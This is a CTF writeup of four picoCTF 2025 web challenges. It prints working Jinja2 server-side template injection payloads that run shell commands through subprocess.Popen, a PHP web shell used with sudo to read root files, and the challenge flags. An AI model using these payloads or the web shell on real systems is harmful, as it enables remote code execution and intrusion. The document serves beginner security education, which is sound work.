# picoCTF 2025 Writeup

**This post consists of writeups of the challenges DarkR7-@ had solved in PicoCTF practice.**

### About picoCTF

picoCTF is a beginner-friendly cybersecurity competition created by security experts at Carnegie Mellon University. It presents real-world cybersecurity challenges in a fun, gamified format that's perfect for students, hobbyists, and anyone new to CTFs (Capture The Flag). The challenges cover a range of topics‚Äîfrom basic scripting and cryptography to web exploitation and reverse engineering‚Äîmaking it a great way to learn practical hacking skills while having fun.


This is their official website : https://picoctf.org/


## WEB CTF EASY 

## SSTl1(Server side template vulnerable)



### üìå Challenge Description

> Can you exploit this website? Try to get the website to evaluate a Jinja expression.  


> Link: http://rescued-float.picoctf.net:59626/
 


### üß† Understanding the Challenge

This is a **Server-Side Template Injection (SSTI)** challenge using the **Jinja2** template engine.

Our goal is to inject Jinja2 expressions to get the server to execute arbitrary code and ultimately leak the flag.



### üõ†Ô∏è Step-by-Step Solution

#### 1. Open the Website

The page asks for input and returns it rendered back. This suggests it may be vulnerable to SSTI.

#### 2. Test for Injection

We enter a basic test string: 

**&#123;&#123;7*8&#125;&#125;**

If the site returns `56`, then SSTI is confirmed.

#### 3. Try Accessing Built-ins

To escalate, we inject the following payload to access built-ins:


{% raw %}
**Code:** `{{ ''.__class__.mro[2].__subclasses__() }}`
{% endraw %}



This gives access to all subclasses, including `Popen`.





#### 4. Find `subprocess.Popen` Index

We locate the index of `subprocess.Popen` subclass from the list and use it to execute code. Example:

{% raw %}
**Code:** `{{ ''.__class__.mro[2].__subclasses__()[<index>]("ls", shell=True, stdout=-1).communicate() }}`
{% endraw %}



Try commands like `cat flag.txt`.



#### 5. Extract the Flag

Eventually, we find the flag using a working payload like:

{% raw %}
**Code:** `{{ ''.__class__.mro[2].__subclasses__()[<index>]("cat flag.txt", shell=True, stdout=-1).communicate() }}`
{% endraw %}




And finally...

## n0s4n1ty 1 (File upload vulnerabilty)

### üìå Challenge Description

> The challenge presents a **file upload vulnerability** on a web application. Our goal is to exploit this vulnerability to gain access to sensitive data or execute arbitrary code on the server to retrieve the flag.

> Link: http://standard-pizzas.picoctf.net:54419/

### üß† Understanding the Challenge

This challenge revolves around an insecure file upload feature that allows an attacker to upload any type of file. The goal is to upload a PHP file and use it to execute commands on the server.

### üõ†Ô∏è Step-by-Step Solution

#### 1. Open the Website

The website provides a file upload form that accepts all file types ‚Äî including `.php`.

![Initial Site](images/2nd1.png)




#### 2. Create a Malicious PHP File

We create a simple PHP web shell that takes a command from a GET parameter and executes it.

```php
<?php
    echo shell_exec($_GET['cmd']);
?>
```

Upload this file using the site‚Äôs upload feature.

![Uploading PHP](images/2nd5.png)

#### 3. Locate the Uploaded File

After uploading, we try accessing the uploaded file in a predictable upload folder like:

```
http://standard-pizzas.picoctf.net:54419/upload.php
```

We can now append commands to the URL using the `cmd` parameter, for example:

```
http://standard-pizzas.picoctf.net:54419/uploads/malicious.php?cmd=whoami
```


![Test Command Execution](images/2nd6.png)


When we enter: 

```
http://standard-pizzas.picoctf.net:54419/uploads/malicious.php?cmd=sudo -l
```

![Test Command Execution](images/2nd7.png)



This will tell us that we can run any command with any account....


Let's try as root:

To get root we need to redirect to thhis url

```
http://standard-pizzas.picoctf.net:54419/uploads/malicious.php?cmd=sudo ls /root
```

This will list all files in root..


**Here we found flag.txt in root folder...**
 

#### 4. Find the Flag

Once we confirm that our PHP shell is working, we can try reading the flag file.

Try the following in your browser:

```
http://standard-pizzas.picoctf.net:54419/uploads/malicious.php?cmd=sudo cat /root/flag.txt
```

If the file exists and permissions are open, this will output the flag.

#### 5. Flag Retrieved

Success! We see the flag printed on the page.

## head-dump 

Let us find the flag in this head-dump challenge.

![Final Flag](images/head_dump.png)

**Description**

It is a simple blog website. We need to find endpoint of the web applications. There we can get the flag.

First we need to lauch the instance. When we launch the instance we can get a link for the website.
> Link: http://verbal-sleep.picoctf.net:61922/

In challenge description they mentioned about the #API_documentation. So I click on the tag **API documentation**. Which took me to the /api-docs/ page. This page had Swagger UI, a tool used to test and explore API endpoints.

>Link : **http://verbal-sleep.picoctf.net:61922/api-docs/#/Diagnosing/get_heapdump**

Inside Swagger UI, I noticed several API endpoints listed. Since the challenge is called head-dump, the /heapdump endpoint under the diagnosing section immediately stood out.

I used the Try it out button in Swagger UI for the /heapdump endpoint and executed it. The server responded with a download link for a file named something like: heapdump-1747300354692.heapsnapshot

I downloaded the file, which turned out to be quite large. Since picoCTF flags are always in the format picoCTF{}, I decided to search the file for this pattern using the grep command

{% raw %}
**Code:** `cat heapdump-1746773498002.heapsnapshot | grep picoCTF`
{% endraw %}

And we got the flag!

> Flag : **picoCTF{Pat!3nt_15_Th3_K3y_f1179e46}**

## Cookie Monster Secret Recipe

### Description

![CM1](images/cm1.png)

By clicking on the challenge link, we‚Äôre redirected to a website titled Cookie Monster‚Äôs Secret Recipe.

Since the challenge hints at a ‚Äúcookie recipe,‚Äù it made sense to check if the website was using any actual cookies. Sometimes CTF challenges love hiding clues inside HTTP cookies, so let‚Äôs explore that possibility.

Here open the inspect page and find storage section. There you will see the cookie.

{% raw %}
**Cookie:** `cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzX0FDOEZDRDc1fQ%3D%3D`
{% endraw %}

### Decoding

Find CYBERCHEF website online and open it. In the cookie we can notice the %3D at the end. That‚Äôs a URL-encoded = sign. This indicates the entire string might be URL-encoded.

> Search for URL Decode in the operations tab and drag it into the recipe section.
> Paste the cookie value in the input box.

Now we get :

**cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzX0FDOEZDRDc1fQ**

Notice the == at the end? That‚Äôs a classic hint for Base64 encoding. In CyberChef, search for From Base64 and drag it below the previous operation. 

Then the output reveals our flag : 

**picoCTF{c00k1e_m0nster_l0ves_c00kies_AC8FCD75}**
